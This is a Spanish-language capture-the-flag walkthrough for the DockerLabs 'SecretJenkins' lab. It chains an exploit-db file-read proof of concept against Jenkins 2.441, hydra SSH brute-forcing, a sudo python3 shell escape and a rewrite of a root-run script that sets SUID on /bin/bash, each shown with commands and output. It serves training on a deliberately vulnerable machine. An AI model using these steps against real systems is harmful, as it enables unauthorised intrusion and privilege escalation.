---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SecretJenkins DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip secretjenkins.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh secretjenkins.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 05:43 EST
Nmap scan report for spainmerides.dl (172.17.0.2)
Host is up (0.000039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.18)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

Por lo que vemos esta abierto el puerto `8080` que en este caso pertenece a un `jenkins`, si entramos en la pagina veremos un `login`, si probamos las credenciales por defecto veremos que no funciona, por lo que haremos lo siguiente:

## Escalate user bobby

Vamos a ver de que version es el `jenkins`:

```shell
whatweb http://<IP>:8080/
```

Info:

```
http://172.17.0.2:8080/ [403 Forbidden] Cookies[JSESSIONID.89c2315d], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.89c2315d], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://172.17.0.2:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.89c2315d], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.89c2315d], IP[172.17.0.2], Jenkins[2.441], Jetty[10.0.18], PasswordField[j_password], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session], X-Frame-Options[sameorigin]
```

Vamos a ver si la version `2.441` de `jenkins` es vulnerable, pero vemos que si lo es, por lo que dejare el `PoC` en el siguiente link:

URL = [Exploit Jenkins](https://www.exploit-db.com/exploits/51993)

### Exploit

Si nos lo descargamos, lo tendremos que utilizar de la siguiente forma:

```shell
python3 51993.py -u http://<IP>:8080 -p /etc/passwd
```

Info:

```
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bobby:x:1001:1001::/home/bobby:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash
```

Por lo que vemos funciona y hemos listado el archivo `passwd`.

### Hydra

Vamos a intentar tirar fuerza bruta a los 2 usuarios que hemos encontrado:

> users.txt

```
bobby
pinguinito
```

```shell
hydra -L users.txt -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-09 05:58:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688798 login tries (l:2/p:14344399), ~448263 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Por lo que vemos obtenemos las credenciales del usuario `bobby`, por lo que nos conectaremos por `SSH`.

### SSH

```shell
ssh bobby@<IP>
```

Metemos como contraseña `chocolate` y veremos que estamos dentro.

## Escalate user pinguinito

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bobby on c5b862b2d8af:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bobby may run the following commands on c5b862b2d8af:
    (pinguinito) NOPASSWD: /usr/bin/python3
```

Vemos que podemos ejecutar el binario `python3` como el usuario `pinguinito`, por lo que haremos lo siguiente:

```shell
sudo -u pinguinito python3 -c 'import os; os.system("/bin/bash")'
```

Y con esto seremos el usuario `pinguinito`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pinguinito on c5b862b2d8af:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pinguinito may run the following commands on c5b862b2d8af:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Vemos que podemos ejecutar el binario `python3` en el directorio `/opt/script.py` como el usuario `root`.

Si vemos lo que hace el `script`:

```python
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

Si vemos los permisos del script:

```shell
ls -la /opt/script.py
```

Info:

```
-r-xr--r-- 1 pinguinito root 272 May 11  2024 /opt/script.py
```

Vemos que somos el propietario del script, por lo que podremos hacer lo siguiente:

```shell
rm /opt/script.py
```

Una vez que lo hayamos eliminado, crearemos el script con el mismo nombre pero añadiendo lo siguiente:

```shell
echo -e "import os\n\nos.system('chmod u+s /bin/bash')\nprint('Permisos SUID aplicados a /bin/bash')" > /opt/script.py
```

Ahora hacemos lo siguiente:

```shell
sudo /usr/bin/python3 /opt/script.py
```

Info:

```
Permisos SUID aplicados a /bin/bash
```

Vamos a comprobar que se aplico correctamente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Vemos que se aplico correctamente, por lo que haremos lo siguiente para ser `root`:

```shell
bash -p
```

Y con esto ya seremos `root`.
